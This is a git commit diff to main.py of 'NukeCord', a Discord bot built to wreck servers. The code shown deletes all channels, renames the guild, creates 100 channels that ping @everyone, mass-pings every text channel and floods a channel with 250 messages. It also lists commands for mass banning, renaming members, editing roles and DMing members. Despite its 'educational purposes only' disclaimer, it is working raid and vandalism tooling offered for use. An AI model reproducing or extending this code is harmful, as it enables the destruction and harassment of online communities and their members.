eaa31bf1175b188ada2de59075b31a9fbbf8e89b
evo <84800113+evo0616lution@users.noreply.github.com>
2022-01-30 16:20:12 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,30 +1,56 @@
-print("[!] Don't forget to fill out the information in config.json")
-input("[!] Make sure that the server member intent is activated. Press enter when ready. ")
-print("[~] Do nc!duck to get all commands")
 import discord 
 from discord.ext import commands
 import json, os
+from colorama import Fore as color
 intents = discord.Intents.default()
 intents.members = True
 bot = commands.Bot(command_prefix="nc!", intents=intents)
 bot.remove_command("help")
+print(color.YELLOW + """
+                         __    _                                   
+                    _wr""        "-q__                             
+                 _dP                 9m_     
+               _#P                     9#_                         
+              d#@                       9#m                        
+             d##                         ###                       
+            J###                         ###L                      
+            {###K                       J###K                      
+            ]####K      ___aaa___      J####F                      
+        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
+     _g##############mZ_         __g##############m_               
+   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
+  a###""          ,Z"#####@" '######"\g          ""M##m            
+ J#@"             0L  "*##     ##@"  J#              *#K           
+ #"               `#    "_gmwgm_~    dF               `#_          
+7F                 "#_   ]#####F   _dK                 JE          
+]                    *m__ ##### __g@"                   F          
+                       "PJ#####LP"                                 
+ `                       0######_                      '           
+                       _0########_                                   
+     .               _d#####^#####m__              ,              
+      "*w_________am#####P"   ~9#####mw_________w*"                  
+          ""9@#####@M""           ""P@#####@M""                    
+
+
+
+""")
 f = open("config.json", "r")
 x = f.read()
 y = json.loads(x)
 TOKEN = y["token"]
 O = y["your_id"]
 ID = int(O)
-
+print(color.RESET + "[~] Do nc!help to get all commands")
 
 @bot.event 
 async def on_ready():
-    print(f"[~] Logged in as {bot.user}")
+    print(color.GREEN + f"[~] Logged in as {bot.user}")
 
 
 @bot.command()
-async def duck(ctx):
+async def help(ctx):
     if ctx.author.id == ID:
-        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!spam <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```", color=0x36393e)
+        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```", color=0x36393e)
         embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
         await ctx.send(embed=embed)
 
@@ -39,24 +65,35 @@ async def nuke(ctx, *, arg):
             try:
                 await channel.delete()
             except:
-                print("\n")
+                print(color.RED + f"[!] Error deleting {channel.name}")
         await ctx.guild.edit(name=arg)
         x = 100
         while x >= 0:
-            await ctx.guild.create_text_channel(arg)
+            ch = await ctx.guild.create_text_channel(arg)
+            await ch.send(f"{arg} | @everyone")
             x = int(x) -1
-        print(f"[~] Nuked {ctx.guild.name}")
+        print(color.GREEN + f"[~] Nuked {ctx.guild.name}")
 
 @bot.command()
 @commands.guild_only()
-async def spam(ctx, *, arg):
+async def alert(ctx, *, arg):
     if ctx.author.id == ID:
         for channel in ctx.guild.channels:
             if type(channel) != discord.channel.TextChannel:
                 print("\n")
             else:
-                await channel.send(f"{arg} @everyone")
-            
+                await channel.send(f"{arg} | @everyone")
+                
+                
+@bot.command()
+@commands.guild_only()
+async def flood(ctx, *, arg):
+    if ctx.author.id == ID:
+        i = 250
+        while i >= 0:
+            await ctx.send(arg)
+            i = int(i) - 1
+        print(color.GREEN + f"Flooded {ctx.channel.name}")
 
             
 @bot.command()
